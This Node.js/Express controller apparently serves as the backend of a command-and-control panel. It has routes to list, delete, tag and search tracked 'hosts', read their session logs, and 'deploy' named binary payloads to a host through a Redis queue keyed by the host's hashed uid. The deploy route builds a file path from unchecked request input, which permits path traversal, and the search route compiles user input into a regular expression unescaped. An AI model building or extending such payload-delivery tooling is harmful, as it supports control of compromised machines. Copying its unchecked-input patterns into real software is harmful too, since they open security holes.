const fs = require('fs');
const crypto = require('crypto');
const util = require('util');
const read_file = util.promisify(fs.readFile);
const msgpack = require('msgpack-lite');
const pako = require('pako');
const Redis = require("ioredis");
const redis = new Redis();
const Config = require('../config');
const Host = require('../models/host');
const Session = require('../models/session');
exports.verify = (req, res, next) => {
    const api_key = req.header("x-api-key");
    if(api_key !== Config.api_key){
        return res.status(403).send("x-api-key missing or error.");
    }
    next();
}
exports.list = async (req, res, next) => {
    let docs = await Host
        .find({},{_id: 0,_v:0,__v:0})
        .exec();
    return res.send(docs);
}
exports.delete = async (req, res, next) => {
    let doc = await Host.findOneAndRemove({'uid': req.body.uid}).exec();
    if (!doc) {
        return res.status(500).send({message: 'host not found'});
    }
        return res.send({message: 'host deleted.'});
}
exports.note = async (req, res, next) => {
    let doc = await Host.set_note(req.body.uid, req.body.note);
    if (!doc) {
        return res.status(500).send({message: 'host not found'});
    }
    return res.send(doc);
}
exports.search = async (req, res, next) => {
    let docs = await Host
        .find({ words: new RegExp(req.body.word, 'i') },{_id: 0,_v:0,__v:0})
        .exec();
    return res.send(docs);
}
exports.log = async (req, res, next) => {
    let doc = await Session.findOne({'uid': req.body.uid}).exec();
    if (!doc ||!doc.sessions||doc.sessions.length < 1) {
        return res.status(500).send({message: 'log not found'});
    }
    return res.send(doc);
}
exports.deploy = async (req, res, next) => {
    if(!fs.existsSync(`./private/${req.body.payload}.bin`)){
        return res.status(500).send({message: 'payload not found'});
    }
    const buf = await read_file(`./private/${req.body.payload}.bin`);
    const uid_hash = crypto.createHash('md5').update(req.body.uid).digest('hex');
    redis.lpush(uid_hash,msgpack.encode([1,buf]));
    redis.expire(uid_hash, 86400);
    return res.status(200).send({message: `${req.body.payload} deployed.`});
}